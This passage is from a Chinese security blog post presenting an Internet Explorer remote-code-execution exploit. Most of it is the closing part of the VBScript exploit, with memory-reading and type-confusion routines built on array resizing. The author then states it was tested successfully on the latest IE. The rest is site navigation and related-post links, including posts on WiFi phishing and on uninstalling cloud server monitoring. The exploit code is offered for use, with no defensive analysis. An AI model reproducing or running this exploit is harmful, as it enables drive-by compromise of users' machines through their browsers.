class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j=0&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j=readmemo(i+&amp;h120+k)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Exit&nbsp;<span class="keyword">for</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;next&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;ab(2)=1.69759663316747E-313&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;runmumaa()&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>end&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span><span class="keyword">function</span><span>&nbsp;Over()&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;dim&nbsp;type1,type2,type3&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;Over=False&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;a0=a0+a3&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;a1=a0+2&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;a2=a0+&amp;h8000000&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;&nbsp;ab(a0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a2)&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;type1=1&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=1.123456789012345678901234567890&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;aa(a0)=10&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;If(IsObject(aa(a1-1))&nbsp;=&nbsp;False)&nbsp;Then&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span><span>(intVersion&lt;4)&nbsp;then&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mem=cint(a0+1)*16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j=vartype(aa(a1-1))&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span><span>((j=mem+4)&nbsp;or&nbsp;(j*8=mem+8))&nbsp;then&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span><span>(vartype(aa(a1-1))&lt;&gt;0)&nbsp;&nbsp;Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If(IsObject(aa(a1))&nbsp;=&nbsp;False&nbsp;)&nbsp;Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type1=VarType(aa(a1))&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">else</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit&nbsp;&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">else</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="keyword">if</span><span>(vartype(aa(a1-1))&lt;&gt;0)&nbsp;&nbsp;Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;If(IsObject(aa(a1))&nbsp;=&nbsp;False&nbsp;)&nbsp;Then&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;type1=VarType(aa(a1))&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;end&nbsp;<span class="keyword">if</span><span>&nbsp;&nbsp;</span></span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;If(type1=&amp;h2f66)&nbsp;Then&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Over=True&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;If&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;If(type1=&amp;hB9AD)&nbsp;Then&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Over=True&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win9x=1&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;End&nbsp;If&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>end&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span><span class="keyword">function</span><span>&nbsp;ReadMemo(add)&nbsp;&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;On&nbsp;Error&nbsp;Resume&nbsp;Next&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a2)&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;aa(a1)=add+4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=1.69759663316747E-313&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;ReadMemo=lenb(aa(a1))&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;ab(0)=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;&nbsp;redim&nbsp;&nbsp;Preserve&nbsp;aa(a0)&nbsp;&nbsp;</span></li><li class=""><span>end&nbsp;<span class="keyword">function</span><span>&nbsp;&nbsp;</span></span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&lt;/script&gt;&nbsp;&nbsp;</span></li><li class="alt"><span>&nbsp;&nbsp;&nbsp;</span></li><li class=""><span>&lt;/body&gt;&nbsp;&nbsp;</span></li><li class="alt"><span>&lt;/html&gt;&nbsp;&nbsp;</span></li></ol></div><p>最新ie下测试成功。</p><div class="entry-copyright"><p>原创文章，作者：老D，如若转载，请注明出处：https://laod.cn/security/win10-ie11-0day.html</p></div></div><div class="entry-tag"><a href="https://laod.cn/tag/ie%e6%bc%8f%e6%b4%9e" rel="tag">IE漏洞</a><a href="https://laod.cn/tag/%e6%b5%8f%e8%a7%88%e5%99%a8%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e" rel="tag">浏览器执行漏洞</a></div><div class="entry-action"><div class="btn-zan" data-id="247"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up-fill"></use></svg></i> 赞 <span class="entry-action-num">(0)</span></div></div><div class="entry-bar"><div class="entry-bar-inner clearfix"><div class="info text-center"><div class="info-item meta"> <a class="meta-item j-heart" href="javascript:;" data-id="247"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i> <span class="data">0</span></a> <a class="meta-item" href="#comments"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i> <span class="data">2</span></a></div><div class="info-item share"> <a class="meta-item mobile j-mobile-share" href="javascript:;" data-id="247" data-qrcode="https://laod.cn/security/win10-ie11-0day.html"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-share"></use></svg></i> 生成海报</a> <a class="meta-item wechat" data-share="wechat" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-wechat"></use></svg></i> </a> <a class="meta-item weibo" data-share="weibo" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-weibo"></use></svg></i> </a> <a class="meta-item qq" data-share="qq" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-qq"></use></svg></i> </a> <a class="meta-item qzone" data-share="qzone" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-qzone"></use></svg></i> </a></div><div class="info-item act"> <a href="javascript:;" id="j-reading"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-article"></use></svg></i></a></div></div></div></div></div><div class="entry-page"><div class="entry-page-prev entry-page-nobg" style="background-image: url();"> <a href="https://laod.cn/security/wifi-hacker.html" title="黑客全自动WIFI钓鱼,全自动无线入侵热点，大规模批量无线热点钓鱼" rel="prev"> <span>黑客全自动WIFI钓鱼,全自动无线入侵热点，大规模批量无线热点钓鱼</span> </a><div class="entry-page-info"> <span class="pull-left"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-arrow-left-double"></use></svg></i> 上一篇</span> <span class="pull-right">2014-11-03 21:32</span></div></div><div class="entry-page-next entry-page-nobg" style="background-image: url();"> <a href="https://laod.cn/movie/back-to-priscilla-live-2014.html" title="陈慧娴 &#8211; Back to Priscilla 30周年演唱会 Live &#8211; 2014 1080P+[WAV+CUE]百度云" rel="next"> <span>陈慧娴 &#8211; Back to Priscilla 30周年演唱会 Live &#8211; 2014 1080P+[WAV+CUE]百度云</span> </a><div class="entry-page-info"> <span class="pull-right">下一篇 <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-arrow-right-double"></use></svg></i></span> <span class="pull-left">2014-11-14 20:22</span></div></div></div><div class="entry-related-posts"><h3 class="entry-related-title">相关推荐</h3><ul class="entry-related cols-3 post-loop post-loop-default"><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/aliyun-rhsa-20183092-rhsa-20183157.html" title="修复两个阿里云服务器提示的高危漏洞 RHSA-2018:3092 RHSA-2018:3157" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="修复两个阿里云服务器提示的高危漏洞 RHSA-2018:3092 RHSA-2018:3157" data-lazy-src="https://laod.cn/wp-content/uploads/2018/12/al-480x300.jpeg"><noscript><img src="https://laod.cn/wp-content/uploads/2018/12/al-480x300.jpeg" width="480" height="300" alt="修复两个阿里云服务器提示的高危漏洞 RHSA-2018:3092 RHSA-2018:3157"></noscript> </a> <a class="item-category" href="https://laod.cn/security" target="_blank">网络安全</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/aliyun-rhsa-20183092-rhsa-20183157.html" target="_blank" rel="bookmark"> 修复两个阿里云服务器提示的高危漏洞 RHSA-2018:3092 RHSA-2018:3157 </a></h4><div class="item-excerpt"><p>今天登陆阿里云控台，发现阿里云提示有两个高危的漏洞，分别是： RHSA-2018:3092: glibc security, bug fix, and enhancement up&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2018-12-07</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>4.9K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/aliyun-rhsa-20183092-rhsa-20183157.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>0</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item item-no-thumb"><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/mysql-4-0-access.html" target="_blank" rel="bookmark"> Mysql 4.0利用子查询忽略字段名 </a></h4><div class="item-excerpt"><p>BMa (安全技术爱好者！) | 2014-11-16 19:08 前段时间看了这篇帖子： ACCESS利用子查询忽略字段名:http://zone.wooyun.org/cont&#8230;</p></div><div class="item-meta"> <a class="item-meta-li" href="https://laod.cn/security" target="_blank">网络安全</a> <span class="item-meta-li date">2014-11-18</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>2.4K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/mysql-4-0-access.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>0</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/quartz_uninstall.html" title="卸载安骑士 屏蔽阿里云ECS以及腾讯云后台监控 一键卸载监控脚本" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="卸载安骑士 屏蔽阿里云ECS以及腾讯云后台监控 一键卸载监控脚本" data-lazy-src="https://laod.cn/wp-content/uploads/2017/03/20170309165219-480x300.png"><noscript><img src="https://laod.cn/wp-content/uploads/2017/03/20170309165219-480x300.png" width="480" height="300" alt="卸载安骑士 屏蔽阿里云ECS以及腾讯云后台监控 一键卸载监控脚本"></noscript> </a> <a class="item-category" href="https://laod.cn/security" target="_blank">网络安全</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/quartz_uninstall.html" target="_blank" rel="bookmark"> 卸载安骑士 屏蔽阿里云ECS以及腾讯云后台监控 一键卸载监控脚本 </a></h4><div class="item-excerpt"><p>国内的服务器：阿里云、腾讯云的服务器跟百度云加速都自带监控，它会自动检测你的文章内容跟URL。 你可能会发现有些网站或者出现关键字会被扫描到提示不安全内容，而且可能会被自动屏蔽这篇&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2019-05-23</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>7.3K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/quartz_uninstall.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>2</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/wifi-zanti-icmp.html" title="如何连上公共WIFI装逼" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="如何连上公共WIFI装逼" data-lazy-src="https://laod.cn/wp-content/uploads/2016/05/BusyBox-480x300.jpg"><noscript><img src="https://laod.cn/wp-content/uploads/2016/05/BusyBox-480x300.jpg" width="480" height="300" alt="如何连上公共WIFI装逼"></noscript> </a> <a class="item-category" href="https://laod.cn/security" target="_blank">网络安全</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/wifi-zanti-icmp.html" target="_blank" rel="bookmark"> 如何连上公共WIFI装逼 </a></h4><div class="item-excerpt"><p>首先在（安卓）手机里下载好zANTI(dSploit)也行,BusyBox（前提要ROOT） 打开我们的系统软件BusyBox安装 然后打开我们的装逼神器zANTI，找到我们的目标&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2016-05-24</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>8.4K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/wifi-zanti-icmp.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>12</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/wannacry-445.html" title="Wannacry蠕虫勒索软件“永恒之蓝”3种修复方案" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="Wannacry蠕虫勒索软件“永恒之蓝”3种修复方案" data-lazy-src="https://laod.cn/wp-content/uploads/2017/05/445-480x300.jpg"><noscript><img src="https://laod.cn/wp-content/uploads/2017/05/445-480x300.jpg" width="480" height="300" alt="Wannacry蠕虫勒索软件“永恒之蓝”3种修复方案"></noscript> </a> <a class="item-category" href="https://laod.cn/security" target="_blank">网络安全</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/wannacry-445.html" target="_blank" rel="bookmark"> Wannacry蠕虫勒索软件“永恒之蓝”3种修复方案 </a></h4><div class="item-excerpt"><p>据BBC报道，计算机网络病毒攻击已经扩散到74个国家，包括美国、英国、中国、俄罗斯、西班牙、意大利等。请注意：目前国内正在大规模的传播勒索软件，本次攻击的主要目标是位于全国各地的高&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2017-05-13</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>8.9K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/wannacry-445.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>10</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/cve-2016-10033-wordpress.html" title="CVE-2016-10033:WordPress 未授权远程代码执行漏洞" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="CVE-2016-10033:WordPress 未授权远程代码执行漏洞" data-lazy-src="https://laod.cn/wp-content/uploads/2016/08/WordPress-4.6-480x300.png"><noscript><img src="https://laod.cn/wp-content/uploads/2016/08/WordPress-4.6-480x300.png" width="480" height="300" alt="CVE-2016-10033:WordPress 未授权远程代码执行漏洞"></noscript> </a> <a class="item-category" href="https://laod.cn/security" target="_blank">网络安全</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/security/cve-2016-10033-wordpress.html" target="_blank" rel="bookmark"> CVE-2016-10033:WordPress 未授权远程代码执行漏洞 </a></h4><div class="item-excerpt"><p>2017年5月3日，开源CMS软件WordPress被曝出多个漏洞，其中一个高危漏洞可以远程执行任意代码，从而获取服务权限。 具体详情如下: 漏洞编号: CVE-2016-1003&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2017-05-05</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>3.0K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/security/cve-2016-10033-wordpress.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>0</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/security/google%e3%80%81mozilla%e3%80%81apple-ssl-ios11.html" title="苹果开始打击辣鸡SSL证书 iOS 11不再信赖WoSign(沃通)证书" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="苹果开始打击辣鸡SSL证书 iOS 11不再信赖WoSign(沃通)证书" 